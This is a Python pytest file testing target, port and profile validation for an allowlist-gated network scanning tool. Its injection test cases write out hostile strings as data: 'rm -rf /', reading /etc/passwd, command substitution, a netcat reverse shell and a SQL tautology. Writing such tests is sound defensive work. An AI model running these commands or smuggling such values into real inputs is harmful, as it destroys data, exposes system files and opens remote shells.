"""
Unit tests for target validation and allowlist enforcement.

Tests cover:
- Valid targets (IP, CIDR, hostname)
- Invalid formats
- Shell injection strings
- Allowlist enforcement (authorized, unauthorized, empty)
- Port validation
- Profile validation
"""

from __future__ import annotations

import pytest

from app.core.errors import AllowlistError, ValidationError
from app.core.validation import (
    Allowlist,
    validate_ports,
    validate_profile,
    validate_target,
)


class TestValidateTarget:
    """Test target format validation and allowlist checks."""

    # ── Valid targets ─────────────────────────────────────

    def test_valid_ip_in_allowlist(self, sample_allowlist: Allowlist) -> None:
        result = validate_target("192.168.56.101", sample_allowlist)
        assert result == "192.168.56.101"

    def test_valid_ip_second_entry(self, sample_allowlist: Allowlist) -> None:
        result = validate_target("192.168.56.102", sample_allowlist)
        assert result == "192.168.56.102"

    def test_valid_hostname_in_allowlist(self, sample_allowlist: Allowlist) -> None:
        result = validate_target("dvwa.local", sample_allowlist)
        assert result == "dvwa.local"

    def test_hostname_case_insensitive(self, sample_allowlist: Allowlist) -> None:
        result = validate_target("DVWA.LOCAL", sample_allowlist)
        assert result == "DVWA.LOCAL"

    def test_valid_ip_in_cidr_range(self, allowlist_with_cidr: Allowlist) -> None:
        result = validate_target("10.0.0.50", allowlist_with_cidr)
        assert result == "10.0.0.50"

    def test_target_strips_whitespace(self, sample_allowlist: Allowlist) -> None:
        result = validate_target("  192.168.56.101  ", sample_allowlist)
        assert result == "192.168.56.101"

    # ── Unauthorized targets ──────────────────────────────

    def test_ip_not_in_allowlist(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(AllowlistError, match="not in the allowlist"):
            validate_target("10.0.0.1", sample_allowlist)

    def test_hostname_not_in_allowlist(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(AllowlistError, match="not in the allowlist"):
            validate_target("evil.com", sample_allowlist)

    def test_ip_outside_cidr_range(self, allowlist_with_cidr: Allowlist) -> None:
        with pytest.raises(AllowlistError, match="not in the allowlist"):
            validate_target("10.0.1.1", allowlist_with_cidr)

    def test_empty_allowlist_rejects_all(self, empty_allowlist: Allowlist) -> None:
        with pytest.raises(AllowlistError, match="empty"):
            validate_target("192.168.56.101", empty_allowlist)

    # ── Invalid formats ───────────────────────────────────

    def test_empty_target(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="must not be empty"):
            validate_target("", sample_allowlist)

    def test_whitespace_only(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="must not be empty"):
            validate_target("   ", sample_allowlist)

    def test_too_long_target(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="too long"):
            validate_target("a" * 300, sample_allowlist)

    def test_invalid_ip_format(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises((ValidationError, AllowlistError)):
            validate_target("999.999.999.999", sample_allowlist)

    def test_cidr_too_broad(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="too broad"):
            validate_target("10.0.0.0/8", sample_allowlist)

    def test_localhost_rejected(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="Cannot scan localhost"):
            validate_target("localhost", sample_allowlist)

    # ── Shell injection strings ───────────────────────────
    # These MUST all be rejected at the dangerous-characters check
    # BEFORE they reach any downstream processing.

    @pytest.mark.parametrize(
        "injection",
        [
            "192.168.56.101; rm -rf /",
            "192.168.56.101 | cat /etc/passwd",
            "192.168.56.101 & whoami",
            "192.168.56.101`whoami`",
            "$(whoami)",
            "192.168.56.101 && echo pwned",
            "test$(id)",
            "192.168.56.101; nc -e /bin/sh 10.0.0.1 4444",
            "target' OR '1'='1",
            '192.168.56.101"',
            "192.168.56.101\\",
        ],
    )
    def test_injection_strings_rejected(self, injection: str, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="invalid characters"):
            validate_target(injection, sample_allowlist)

    # ── Dangerous character coverage ──────────────────────

    @pytest.mark.parametrize(
        "char",
        [
            ";",
            "|",
            "&",
            "`",
            "$",
            "(",
            ")",
            "{",
            "}",
            "[",
            "]",
            "!",
            "#",
            ">",
            "<",
            "\\",
            '"',
            "'",
            "^",
            "%",
        ],
    )
    def test_each_dangerous_char_rejected(self, char: str, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="invalid characters"):
            validate_target(f"192.168.56.101{char}", sample_allowlist)


class TestValidatePorts:
    """Test port specification validation."""

    def test_none_returns_none(self) -> None:
        assert validate_ports(None) is None

    def test_empty_returns_none(self) -> None:
        assert validate_ports("") is None

    def test_single_port(self) -> None:
        assert validate_ports("80") == "80"

    def test_port_list(self) -> None:
        assert validate_ports("22,80,443") == "22,80,443"

    def test_port_range(self) -> None:
        assert validate_ports("1-1024") == "1-1024"

    def test_protocol_prefix(self) -> None:
        assert validate_ports("T:80,U:53") == "T:80,U:53"

    def test_port_zero_rejected(self) -> None:
        with pytest.raises(ValidationError, match="out of"):
            validate_ports("0")

    def test_port_too_high(self) -> None:
        with pytest.raises(ValidationError, match="out of range"):
            validate_ports("70000")

    def test_reversed_range(self) -> None:
        with pytest.raises(ValidationError, match="out of bounds"):
            validate_ports("443-80")

    def test_invalid_chars_in_ports(self) -> None:
        with pytest.raises(ValidationError, match="invalid characters"):
            validate_ports("80;rm -rf /")

    def test_alpha_in_ports(self) -> None:
        with pytest.raises(ValidationError, match="invalid characters"):
            validate_ports("abc")


class TestValidateProfile:
    """Test scan profile validation."""

    def test_valid_profile(self, sample_allowlist: Allowlist) -> None:
        assert validate_profile("quick", sample_allowlist) == "quick"

    def test_profile_case_insensitive(self, sample_allowlist: Allowlist) -> None:
        assert validate_profile("STANDARD", sample_allowlist) == "standard"

    def test_unknown_profile_rejected(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="not allowed"):
            validate_profile("aggressive", sample_allowlist)

    def test_empty_profile_rejected(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="must not be empty"):
            validate_profile("", sample_allowlist)

    def test_injection_in_profile(self, sample_allowlist: Allowlist) -> None:
        with pytest.raises(ValidationError, match="invalid characters"):
            validate_profile("quick; rm -rf /", sample_allowlist)


class TestAllowlistLoading:
    """Test YAML allowlist loading."""

    def test_load_from_yaml(self, tmp_path) -> None:
        yaml_content = """
targets:
  - ip: "10.0.0.1"
    description: "Test target"
  - hostname: "test.local"
    description: "Test hostname"
allowed_profiles:
  - quick
  - standard
max_concurrent_scans: 3
"""
        yaml_file = tmp_path / "allowlist.yaml"
        yaml_file.write_text(yaml_content)

        al = Allowlist.from_yaml(yaml_file)
        assert len(al.entries) == 2
        assert al.entries[0].entry_type == "ip"
        assert al.entries[0].value == "10.0.0.1"
        assert al.entries[1].entry_type == "hostname"
        assert al.entries[1].value == "test.local"
        assert al.allowed_profiles == ["quick", "standard"]
        assert al.max_concurrent_scans == 3

    def test_load_with_cidr(self, tmp_path) -> None:
        yaml_content = """
targets:
  - cidr: "192.168.1.0/24"
    description: "Lab network"
"""
        yaml_file = tmp_path / "allowlist.yaml"
        yaml_file.write_text(yaml_content)

        al = Allowlist.from_yaml(yaml_file)
        assert len(al.entries) == 1
        assert al.entries[0].entry_type == "cidr"
        assert al.entries[0].network is not None

    def test_missing_file_raises(self, tmp_path) -> None:
        from app.core.errors import AllowlistLoadError

        with pytest.raises(AllowlistLoadError, match="not found"):
            Allowlist.from_yaml(tmp_path / "nonexistent.yaml")

    def test_invalid_yaml_raises(self, tmp_path) -> None:
        from app.core.errors import AllowlistLoadError

        yaml_file = tmp_path / "bad.yaml"
        yaml_file.write_text("{unclosed: [bracket")

        with pytest.raises(AllowlistLoadError, match="parse"):
            Allowlist.from_yaml(yaml_file)
